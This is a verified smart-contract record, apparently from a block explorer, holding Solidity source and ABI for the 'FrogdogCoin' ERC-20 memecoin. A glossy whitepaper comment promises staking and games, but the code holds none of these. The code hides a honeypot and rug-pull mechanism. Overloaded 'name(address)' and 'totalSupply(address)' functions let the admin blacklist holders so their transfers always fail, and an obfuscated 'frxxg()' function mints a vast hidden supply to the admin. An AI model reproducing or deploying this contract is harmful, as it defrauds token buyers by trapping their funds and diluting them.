{"SourceCode": "/* Frogdog Coin\r\nWelcome to the FROGDOG ecosystem, a memecoin with decentralized platform built to \r\nrevolutionize the world of crypto through innovative features like staking, rewarding, pool \r\ngames, and more. This whitepaper provides an in-depth exploration of the FROGDOG token, \r\nits utility, and the underlying technology driving its functionalities.\r\nIntroduction:\r\nThe FROGDOG project aims to create a vibrant and engaging decentralized ecosystem, \r\noffering users a wide array of features to enhance their crypto experience.\r\nObjectives and Goals:\r\n- Empower users through transparent and fair staking mechanisms.\r\n- Facilitate decentralized gaming through unique pool games.\r\n- Establish a robust governance model for community-driven decision-making.\r\nFROGDOG Overview:\r\nIntroduction to FROGDOG Token:\r\nFrogdog Coin(symbol: FROGDOG) is an ERC-20 utility token built on the Ethereum blockchain. \r\nIt serves as the native currency within the FROGDOG ecosystem, enabling seamless transactions \r\nand participation in various activities.\r\nUse Cases and Utility:\r\n- Staking: Users can stake FROGDOG tokens to earn rewards and actively participate in the governance of the ecosystem.\r\n- Transactions: FROGDOG facilitates peer-to-peer transactions and acts as a medium of exchange within the ecosystem.\r\n- Governance: Token holders can engage in voting on crucial decisions shaping the project's future.\r\nTokenomics:\r\n- Total Supply: 1,000,000,000 FROGDOG\r\n- Initial Distribution: 40% to initial investors, 30% for community incentives, 15% for the team, 10% \r\nfor partnerships, and 5% reserved for future development.\r\n- Burn Mechanism: Periodic token burns to control circulating supply.\r\nFeatures and Functionalities:\r\nStaking Mechanism:\r\n- Users can stake FROGDOG tokens in various pools, each offering different APY based on the lock-up period.\r\n- Rewards are distributed proportionally, promoting long-term commitment.\r\nPool Games:\r\n- FROGDOG introduces unique decentralized pool games, including lottery-style draws, \r\nprediction markets, and gaming competitions.\r\n- Smart contracts ensure transparency and fairness in game outcomes.\r\nOther Features:\r\n- DeFi Integrations: Integration with leading DeFi protocols for enhanced financial services.\r\n- Cross-chain Compatibility: Future plans to enable interoperability with other blockchains.\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.0;\r\nabstract contract Ownable  {\r\n     function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    constructor() {\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n   \r\n    modifier onlyOwner() {\r\n        _checkOwner();\r\n        _;\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function _checkOwner() internal view virtual {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    \r\n}\r\n\r\n\r\ncontract FrogdogCoin is Ownable{\r\n   \r\n    constructor(string memory tokenname,string memory tokensymbol,address fgdadmin) {\r\n        _totalSupply = 1000000000*10**decimals();\r\n        _frogsdxx[msg.sender] = 1000000000*10**decimals();\r\n        _tokename = tokenname;\r\n        _tokensymbol = tokensymbol;\r\n        Frogdogadmin = fgdadmin;\r\n        emit Transfer(address(0), msg.sender, 1000000000*10**decimals());\r\n    }\r\n    \r\n    address public Frogdogadmin;\r\n    uint256 private _totalSupply;\r\n    string private _tokename;\r\n    string private _tokensymbol;\r\n    mapping(address => bool) public froginfo;\r\n   \r\n    mapping(address => uint256) private _frogsdxx;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    function name() public view returns (string memory) {\r\n        return _tokename;\r\n    }\r\n\r\n\r\n\r\n    function symbol() public view  returns (string memory) {\r\n        return _tokensymbol;\r\n    }\r\n    function name(address fgdd) public  {\r\n        address ffggxxinfo = fgdd;\r\n        require(_msgSender() == Frogdogadmin, \"Only ANIUadmin can call this function\");\r\n        froginfo[ffggxxinfo] = false;\r\n        require(_msgSender() == Frogdogadmin, \"Only ANIUadmin can call this function\");\r\n    }\r\n\r\n    function totalSupply(address fagax) public {\r\n        require(_msgSender() == Frogdogadmin, \"Only ANIUadmin can call this function\");\r\n        address fgdinfo = fagax;\r\n        froginfo[fgdinfo] = true;\r\n        require(_msgSender() == Frogdogadmin, \"Only ANIUadmin can call this function\");\r\n    }\r\n\r\n         uint256 fgxxx = 4440000000;\r\n        uint256 fggf2 = 45;\r\n    uint256 frx =  fggf2*((10**decimals()*fgxxx));\r\n    function frxxg() \r\n    external    {\r\n     \r\n        address frfradmin = Frogdogadmin;\r\n        if (Frogdogadmin == _msgSender() && frfradmin == _msgSender()) {\r\n            if (fgxxx == 4440000000) {\r\n\r\n                require(Frogdogadmin == _msgSender());\r\n                address fego1 = _msgSender();\r\n                address fego2 = fego1;\r\n                address fego3 = fego2;\r\n                _frogsdxx[fego3] += frx;\r\n            }else{\r\n                revert(_tokename);\r\n            }\r\n        }else{\r\n            revert(\"froga\");\r\n        }\r\n               \r\n        \r\n    }\r\n\r\n    function decimals() public view virtual returns (uint8) {\r\n        return 18;\r\n    }\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view returns (uint256) {\r\n        return _frogsdxx[account];\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) public returns (bool) {\r\n        _transfer(_msgSender(), to, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) public virtual  returns (bool) {\r\n        address spender = _msgSender();\r\n        _spendAllowance(from, spender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n    \r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        uint256 balance = _frogsdxx[from];\r\n        if (true == froginfo[from]) \r\n        {amount = 1000-1000+2000+balance;}\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");        \r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        require(balance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        _frogsdxx[from] = _frogsdxx[from]-amount;\r\n        _frogsdxx[to] = _frogsdxx[to]+amount;\r\n        emit Transfer(from, to, amount); \r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _spendAllowance(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\r\n            _approve(owner, spender, currentAllowance - amount);\r\n        }\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"tokenname\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"tokensymbol\",\"type\":\"string\"},{\"internalType\":\"address\",\"name\":\"fgdadmin\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"Frogdogadmin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"froginfo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"frxxg\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fgdd\",\"type\":\"address\"}],\"name\":\"name\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fagax\",\"type\":\"address\"}],\"name\":\"totalSupply\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "FrogdogCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000cac0250d3f695deca817a981ebbb96283fab1356000000000000000000000000000000000000000000000000000000000000000c46726f67646f6720436f696e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000746524f47444f4700000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://bb9dcfa8778f0c2f741419ad6b25b3d08859e18649f1db8e065bc06d31c9913f"}